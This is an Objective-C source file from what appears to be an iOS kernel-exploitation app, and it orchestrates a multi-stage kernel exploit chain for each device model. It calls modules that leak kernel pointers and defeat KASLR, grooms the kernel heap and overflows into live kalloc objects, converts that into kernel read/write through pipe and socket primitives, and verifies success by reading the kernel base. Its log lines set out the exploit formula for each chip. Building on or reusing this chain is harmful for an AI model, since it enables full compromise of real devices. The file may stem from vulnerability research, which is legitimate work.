//
//  P007KernelChain.m — KERNEL T1 for Lum1na-Debug.
//

#import "P007KernelChain.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "LabLearn.h"
#import "LabPathTest.h"
#import "P100AutoLearn.h"
#import "P139BootIntel.h"
#import "P044AksKaslrReach.h"
#import "P114SurfaceLeak.h"
#import "P149T8150Krw.h"
#import "P007Board.h"
#import "P007KreadLane.h"
#import "ClearSword/CS2Runner.h"
#import "lumina_core.h"

#include <fcntl.h>
#include <string.h>
#include <unistd.h>

#define KRW_BUILD @"hunt-krw-13"

@implementation P007KernelChain

+ (NSString *)tap {
    NSMutableString *acc = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    int fd = open([[docs stringByAppendingPathComponent:@"p007_kernel_log.txt"]
                   UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);
    void (^L)(NSString *) = ^(NSString *line) {
        if (line.length == 0) return;
        NSString *o = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
        [acc appendString:o];
        if (fd >= 0) {
            const char *p = o.UTF8String;
            if (p) { write(fd, p, strlen(p)); fcntl(fd, F_FULLFSYNC); }
        }
    };

    LabSku sku = [LabDeviceProfile detectedSku];
    NSString *skuName = [LabDeviceProfile skuName] ?: @"?";
    L([NSString stringWithFormat:@"=== KERNEL T1 %@ BUILD %@ ===",
       LabLocalMilitaryNow() ?: @"?", KRW_BUILD]);
    L([LabDeviceProfile identBlock]);
    L([NSString stringWithFormat:@"[*] sku=%@  hasKread still kread32(kbase)==0xfeedfacf",
       skuName]);
    L(@"[*] P097 lock/unlock is catalog-solo. P110/P143/P054 stay catalog-solo. T8150 fires P149.");
    int coreSt = lumina_core_selftest();
    L([NSString stringWithFormat:@"[*] lumina_core %s selftest=%d",
       lumina_core_version(), coreSt]);

    L(@"[STEP 1] P100 AutoLearn (READ-ONLY packet)");
    NSString *p100 = nil;
    @try { p100 = [P100AutoLearn tap]; }
    @catch (NSException *e) { L([NSString stringWithFormat:@"[-] p100 %@", e.name]); }
    if (p100.length) [LabLearn ingestIdent:[LabDeviceProfile identBlock]];

    L(@"[STEP 2] P139 boot intel (no 150s lock/unlock)");
    if (sku == LabSkuA14_23F77 || sku == LabSkuT8150_24A435 || sku == LabSkuT8150_other
        || LabSkuIsA12X(sku)) {
        NSString *p139 = nil;
        @try { p139 = [P139BootIntel tap]; }
        @catch (NSException *e) { L([NSString stringWithFormat:@"[-] p139 %@", e.name]); }
        [LabLearn ingestBootIntel];
        NSString *r139 = [LabPathTest scoreLog:p139 forPath:@"p139"];
        if ([[LabLearn row][@"p139_heap"] isKindOfClass:[NSString class]]) r139 = @"PASS";
        [LabLearn recordPath:@"p139" result:r139 evidence:@"KERNEL P139"];
        L([NSString stringWithFormat:@"PATH_TEST id=p139 class=harvest result=%@", r139]);
    } else {
        L([NSString stringWithFormat:@"[*] P139 SKIP on %@", skuName]);
    }

    L(@"[STEP 3] SKU door");
    if (sku == LabSkuA14_23F77) {
        P007Board *disc = [P007Board shared];
        L(@"[*] DISCLOSE = P010 QueueCreate copyout (P139 harvest 3) + P063 aio kptr (harvest 1).");
        L(@"[*] P010 kptr is layout. Smash is P044 N=192 into a LIVE 0x820 neighbor.");
        L(@"[*] SKIP P099 254 and P073 254 — those remaining-fire into a FREE kalloc.3072 (MAF).");
        L([NSString stringWithFormat:@"[*] board leaks after harvest unique=%lu (P010 records KPTR hits)",
           (unsigned long)disc.leaks.count]);
        L(@"[*] hunt occupancy TAP P044 N=192. conversion ≠ hasKread. 254 remaining-fire SKIP.");
        [LabDeviceProfile beginHuntGroom];
        NSString *gm = [LabDeviceProfile gameModeLine];
        if (gm.length) L(gm);
        NSString *p044 = nil;
        @try { p044 = [P044AksKaslrReach tap]; }
        @catch (NSException *e) { L([NSString stringWithFormat:@"[-] p044 %@", e.name]); }
        NSString *ro = [LabPathTest scoreLog:p044 forPath:@"occ"];
        NSString *rc = [LabPathTest scoreLog:p044 forPath:@"conv"];
        [LabLearn recordPath:@"occ" result:ro evidence:@"KERNEL P044"];
        [LabLearn recordPath:@"conv" result:rc evidence:@"KERNEL P044"];
        L([NSString stringWithFormat:@"PATH_TEST id=occ result=%@", ro]);
        L([NSString stringWithFormat:@"PATH_TEST id=conv result=%@", rc]);
        if ([rc isEqualToString:@"PASS"]) {
            L(@"[*] conversion CONFIRMED this TAP. SocketKRW.Arm HOLD — no rw_inpcb KVA.");
            L(@"[*] 3072 occupancy does not feed icmp6filt +0x148. LightSword last-wire catalog-isolated.");
        } else {
            L(@"[*] conversion unnamed. Occupancy WRITE is not Arm. kreadtest below is the honest miss.");
        }
    } else if (sku == LabSkuT8150_24A435 || sku == LabSkuT8150_other) {
        L(@"[*] 17 pair: P114 sel-8 serializer (READ-ONLY) then P149 conversion. 43748 clamp-CLOSED.");
        NSString *p114 = nil;
        @try { p114 = [P114SurfaceLeak tap]; }
        @catch (NSException *e) { L([NSString stringWithFormat:@"[-] p114 %@", e.name]); }
        NSString *r114 = [LabPathTest scoreLog:p114 forPath:@"p114"];
        [LabLearn recordPath:@"p114" result:r114 evidence:@"KERNEL P114"];
        L([NSString stringWithFormat:@"PATH_TEST id=p114 class=disclosure result=%@", r114]);
        L(@"[STEP 3b] P149 17 conversion (encode N=8 then Set 16463, kernel pipes). PANIC-POSSIBLE.");
        NSString *p149 = nil;
        @try { p149 = [P149T8150Krw tap]; }
        @catch (NSException *e) { L([NSString stringWithFormat:@"[-] p149 %@", e.name]); }
        NSString *r149 = [LabPathTest scoreLog:p149 forPath:@"p149"];
        [LabLearn recordPath:@"p149" result:r149 evidence:@"KERNEL P149"];
        L([NSString stringWithFormat:@"PATH_TEST id=p149 class=conversion result=%@", r149]);
    } else if (sku == LabSkuA14_21D50 || sku == LabSkuA13_22G100) {
        L(@"[*] 12 mini / A13: 43748 not live. KRW door is CS2 then libkrw.");
        P007Board *bb = [P007Board shared];
        if (!bb.hasKread) {
            NSString *cs = nil;
            @try { cs = [CS2Runner runUpstream]; }
            @catch (NSException *e) { L([NSString stringWithFormat:@"[-] cs2 %@", e.name]); }
            if (cs.length) {
                NSUInteger n = cs.length > 240 ? 240 : cs.length;
                L([cs substringToIndex:n]);
            }
        }
        if (!bb.hasKread) {
            bool armed = P007LaneArmBoard();
            L([NSString stringWithFormat:@"[*] libkrw P007LaneArmBoard %@",
               armed ? @"YES" : @"miss (stock / no provider)"]);
        }
    } else if (LabSkuIsA12X(sku)) {
        P007Board *disc = [P007Board shared];
        L(@"[*] A12X DISCLOSE = P010 QueueCreate copyout (P139 harvest 3) + P063 aio HEAP (harvest 1).");
        L(@"[*] SKIP P044/P099/P073 254 — 43748 patched in 26.6; fill_cap=1; remaining-fire is MAF or 0xe00002c2.");
        L(@"[*] 64788 Facet A live until 23G82. 23H30 P065 is EXPECT-BAD oracle. hop-1 EINVAL since 26.1.");
        L(@"[*] PPL-only AfterKread (no SPTM). That helps after hasKread. First KRW is still disclose→convert→Arm→kread32.");
        L([LabDeviceProfile armDump]);
        L([NSString stringWithFormat:@"[*] board leaks after harvest unique=%lu (P010/P063 KPTR hits)",
           (unsigned long)disc.leaks.count]);
        NSUInteger shown = 0;
        for (NSDictionary *e in disc.leaks) {
            if (shown >= 8) break;
            if (![e isKindOfClass:[NSDictionary class]]) continue;
            L([NSString stringWithFormat:@"  leak[%lu] %@ kind=%@ src=%@",
               (unsigned long)shown, e[@"va"] ?: @"?", e[@"kind"] ?: @"?", e[@"source"] ?: @"?"]);
            shown++;
        }
        L(@"[*] CS2 phys_oob READ scan is catalog-solo. kbase=0 is setup. Do not fuse iPad READ with iPhone WRITE.");
        L(@"[*] SocketKRW.Arm HOLD — no rw_inpcb KVA. conversion unnamed.");
    } else {
        L([NSString stringWithFormat:@"[*] no occupancy door on %@", skuName]);
    }

    L(@"[STEP 4] kread32(kbase)==0xfeedfacf");
    NSString *kt = nil;
    @try { kt = [P007Board tapKreadTest]; }
    @catch (NSException *e) { L([NSString stringWithFormat:@"[-] kreadtest %@", e.name]); }
    NSString *rk = [LabPathTest scoreLog:kt forPath:@"kread"];
    [LabLearn recordPath:@"kread" result:rk evidence:@"KERNEL kread"];
    L([NSString stringWithFormat:@"PATH_TEST id=kread result=%@", rk]);
    P007Board *b = [P007Board shared];
    L([NSString stringWithFormat:@"[*] board hasKread=%@ kbase=0x%llx",
       b.hasKread ? @"YES" : @"NO", (unsigned long long)b.kbase]);
    L(@"=== KERNEL T1 END ===");
    L(@"[*] Occupancy CLASS / P139 harvest / P114 REACH are not hasKread.");
    if (sku == LabSkuA14_23F77) {
        L(@"[*] hunt FORMULA: disclose(P010/P063 via P139) → write(P044 N=192 LIVE) → convert → SocketKRW.Arm(rw_inpcb) → kread32.");
        L(@"[*] P099/P073 254 are STANDALONE MAF occupancy. They are not this chain.");
    } else if (sku == LabSkuT8150_24A435 || sku == LabSkuT8150_other) {
        L(@"[*] 17 FORMULA: leak(P114) → write(P142 prepare-then-overshoot inside P149) → convert(P149 pipes) → kread32(kbase)==0xfeedfacf → sptm(HOLD)");
        L(@"[*] PIPE-HIT / QUEUE-INIT is a write receipt, not kread32. P110 catalog-solo. AfterKread HOLD.");
    } else if (sku == LabSkuA14_21D50 || sku == LabSkuA13_22G100) {
        L(@"[*] 12 mini / A13 FORMULA: CS2/libkrw → kread32 → AfterKread FIRE. Staging files ≠ jailbreak.");
    } else if (LabSkuIsA12X(sku)) {
        L(@"[*] A12X FORMULA: disclose(P010/P063 via P139) → CS2 phys_oob READ (catalog) → convert unnamed → SocketKRW.Arm(rw_inpcb) → kread32 → PPL AfterKread.");
        L(@"[*] 254 remaining-fire is not this chain. PPL-only is AfterKread, not first KRW.");
    }

    if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
    return acc;
}

@end
